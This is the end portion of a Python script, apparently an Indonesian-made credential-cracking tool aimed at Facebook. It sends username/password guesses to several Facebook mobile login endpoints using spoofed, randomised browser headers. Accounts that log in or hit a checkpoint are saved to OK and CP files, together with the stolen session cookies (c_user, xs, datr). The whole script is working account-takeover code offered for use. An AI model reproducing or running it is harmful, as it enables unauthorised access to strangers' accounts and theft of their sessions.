    # 'cookie': 'datr=5xlCZcUZoC20eHcjP1RKaq9x; sb=5xlCZQeARAewyul8AgVXu5tI; m_pixel_ratio=1; wd=1348x945; fr=021vFCCZWdLSjl1ME..BlQhnn.ND.AAA.0.0.BlSsdE.AWUz3aQNXS4',
    "dpr": f"{str(rr(1,5))}",
    "origin": f"https://"+url,
    "referer": get,
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
    "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-model": '""',
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": ua,
    "viewport-width": f"{str(rr(300,999))}",
    "x-asbd-id": "129477",
    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
    "x-requested-with": bro,
    "x-response-format": "JSONStream",
}
			ses.post(post,headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r*--> {K}{username}|{pw}{N}')
				open('CP/'+'ASEP-CP.txt','a').write(username+'|'+pw+'\n')
				akun.append(username+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r*--> {H}{username}|{pw}{N}\n*--> {H}{kuki}{N}')
				open('OK/'+okc,'a').write(username+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def geturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
    return gok
def posturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login/device-based/login/async/?api_key=322935469656730&auth_token=a24f0ca89503ac9001f1d2e7750d076c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&refsrc=deprecated&app_id=322935469656730&cancel=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100"
    return gok

def asep():
	os.system("clear")
	print(f"""{asu}                                     
 _____                __ __                 
|  _  |___ ___ ___   |  |  |_ _ ___ _ _ ___ 
|     |_ -| -_| . |  |_   _| | |_ -| | | . |
|__|__|___|___|  _|    |_| |___|___|___|  _|
              |_|                      |_|  
              {N}""")
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	time.sleep(3)
	login()